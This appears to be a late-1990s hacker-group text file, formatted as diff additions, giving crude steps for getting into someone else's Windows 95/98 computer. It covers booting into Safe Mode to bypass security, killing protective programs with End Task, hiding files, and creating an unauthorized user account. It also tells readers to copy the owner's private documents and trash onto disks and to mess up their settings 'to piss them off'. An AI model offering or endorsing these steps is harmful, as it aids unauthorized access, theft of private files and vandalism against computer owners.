+You will need access to a computer terminal (Able To Touch The Computer).
+Next you will need about 15 minutes at the terminal. And a blank disk
+(Two Or a Really high density disk 3-5 megabytes).
+
+
+
+Chapter 2
+
+
+
+Hold down SHIFT when you boot up your computer! Because if you do 
+then it will start up in SAFE MODE and it will bypass security giving 
+you full access, so far this has always worked on all the IBM's i 
+have ever done this with. This will give you full access. 
+It might give you a message saying key stuck or some crap.
+And when it starts up it should give you a message saying it
+started in SAFE MODE for some reason. This will turn off all 
+disabling programs and such.
+
+note: I think this only works in win98' and win95'. 
+Once inside make your own USER so you can access the computer 
+with a legitemate USERNAME AND PASSWORD. SEE chapter 5 on how 
+to do that.
+
+
+
+Chapter 3
+
+
+
+Lets cut the crap on how good IBM's are they weren't built very 
+well because, yes they might have thought it was good at the time 
+but if you press Ctrl+Alt+Del you will get a little box asking you 
+what program you want to shut down if you still can't tell what 
+to do your a little messed up but what you do is find the name 
+of the disabling program whatever, and close it down, it calls 
+it END TASK for some crappy reason. I HATE YOU BILL GATES!
+
+
+
+Chapter 4
+
+
+
+All you have to do is go to My Computer and highlight the object
+you want hidden and while it is still selected go to the File 
+option up in the corner and click properties you get a box saying 
+what it normally is and there should be a few boxs you can click 
+inside it saying [] hidden [] read only [] archive, clicking on the 
+inside of the hidden boxs makes it hidden.
+
+note: (It doesn't disapear right away) clicking the read only
+makes it so that you can only view it no changing or anything all 
+they can do is view it, and the archive thing is crap!
+
+Now once you have clicked the hidden click "OK" now go to the
+view and click options, it should give you a box click on the 
+words that say view up near the top, it will now display view 
+options click HIDE FILES OF THESE TYPES and click OK, If it didn't 
+disappear go to view and click REFRESH.
+
+
+
+Chapter 5
+
+
+
+1. Creating your own USER:    go to SETTINGS under start, 
+click control panel, click on the user folder or the one with heads on it, 
+you should get a box which tells all the users on the machine there 
+will also be a button called NEW USER...
+
+2. Copy all private documents in the computer also all in the
+trash to those TWO EMPTY DISKS...
+
+3. Right click on the mouse and click on preferences and mess
+around with them a ALOT to piss them off.
+
+
+by El Salvador...
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Now its possible to get the United Hackers Association Magazine for
+FREE into your mailbox! Go to our Homepage and select 
+"Subscribe UHA Newsletter" or subscribe direct: 
+http://uha1.listbot.com -or-
+http://www.uha1.com/cgi-bin/mail.cgi -or-
+http://www.uha1.com/cgi-bin/cgiwrap/uha1/mail.cgi
+(at least one of them should work!)
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+If you want to join UHA, please take a look into our join-section 
+on our Homepage! 
+We are also interested in alliances with other Hacking Groups. 
+
+Greetings all memberz of UHA!
+
+
+-=[ United Hackers Association 1 ]=- 
+Email    : webmaster@uha1.com
+Homepage : http://www.uha1.com/   (after the uha is a ONE!) 
+ (if (www.uha1.com!=result)  try http://come.to/UHA) 
+
+******************************* EOF *******************************
